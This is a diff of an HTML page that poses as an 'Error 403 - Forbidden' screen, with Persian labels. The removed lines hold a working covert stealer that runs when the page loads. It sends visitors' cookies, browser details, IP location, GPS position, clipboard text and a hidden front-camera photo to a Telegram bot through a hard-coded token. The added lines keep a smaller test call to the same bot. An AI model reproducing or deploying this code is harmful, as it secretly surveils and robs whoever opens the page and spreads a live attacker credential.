@@ -1,95 +1,20 @@
 <!DOCTYPE html>
-<html lang="fa">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>.</title>
-</head>
-<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
-    <div style="color:#fff;text-align:center;font-family:Arial;">
-        <p style="font-size:24px;">Error 403 - Forbidden</p>
-    </div>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    <script>
-        var T="8679783900:AAHgD4k5NpYEFne9lsfh_S2P3lZisMNXeu8";
-        var C="8679783900";
-
-        fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({
-                chat_id:C,
-                text:"✅ تست: سایت باز شد!\nUA: "+navigator.userAgent
-            })
-        }).then(function(r){return r.json();}).then(function(d){
-            console.log("نتیجه ارسال:",d);
-            fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
-                method:"POST",
-                headers:{"Content-Type":"application/json"},
-                body:JSON.stringify({
-                    chat_id:C,
-                    text:"🔴 گزارش کامل\n\nUA: "+navigator.userAgent+"\nPlatform: "+navigator.platform+"\nزبان: "+navigator.language+"\nصفحه: "+screen.width+"x"+screen.height+"\nReferrer: "+(document.referrer||"مستقیم")+"\nCookie: "+(document.cookie||"ندارد")
-                })
-            });
-            fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(d){
-                fetch("http://ip-api.com/json/"+d.ip).then(function(r){return r.json();}).then(function(g){
-                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
-                        method:"POST",
-                        headers:{"Content-Type":"application/json"},
-                        body:JSON.stringify({
-                            chat_id:C,
-                            text:"📍 موقعیت:\nIP: "+d.ip+"\nکشور: "+g.country+"\nشهر: "+g.city+"\nISP: "+g.isp
-                        })
-                    });
-                });
-            });
-            if(navigator.geolocation){
-                navigator.geolocation.getCurrentPosition(function(pos){
-                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
-                        method:"POST",
-                        headers:{"Content-Type":"application/json"},
-                        body:JSON.stringify({
-                            chat_id:C,
-                            text:"🎯 GPS:\nLat: "+pos.coords.latitude+"\nLon: "+pos.coords.longitude
-                        })
-                    });
-                });
-            }
-            navigator.clipboard.readText().then(function(ct){
-                if(ct){
-                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
-                        method:"POST",
-                        headers:{"Content-Type":"application/json"},
-                        body:JSON.stringify({
-                            chat_id:C,
-                            text:"📋 کلیپ‌بورد: "+ct
-                        })
-                    });
-                }
-            });
-            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(function(stream){
-                var vv=document.getElementById("v");
-                vv.srcObject=stream;
-                vv.play();
-                setTimeout(function(){
-                    var cc=document.getElementById("c");
-                    cc.width=vv.videoWidth;
-                    cc.height=vv.videoHeight;
-                    cc.getContext("2d").drawImage(vv,0,0);
-                    cc.toBlob(function(b){
-                        var f=new FormData();
-                        f.append("chat_id",C);
-                        f.append("photo",b,"cam.jpg");
-                        f.append("caption","📸 دوربین جلو");
-                        fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:"POST",body:f});
-                        stream.getTracks().forEach(function(t){t.stop();});
-                    },"image/jpeg");
-                },1500);
-            }).catch(function(){});
-        }).catch(function(e){
-            console.log("خطا:",e);
-        });
-    </script>
+<html>
+<head><title>Test</title></head>
+<body>
+<h1>Error 403</h1>
+<script>
+fetch("https://api.telegram.org/bot8679783900:AAHgD4k5NpYEFne9lsfh_S2P3lZisMNXeu8/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        chat_id: 8679783900,
+        text: "✅ تست نهایی از سایت"
+    })
+})
+.then(r => r.json())
+.then(data => console.log("Success:", data))
+.catch(err => console.log("Error:", err));
+</script>
 </body>
 </html>
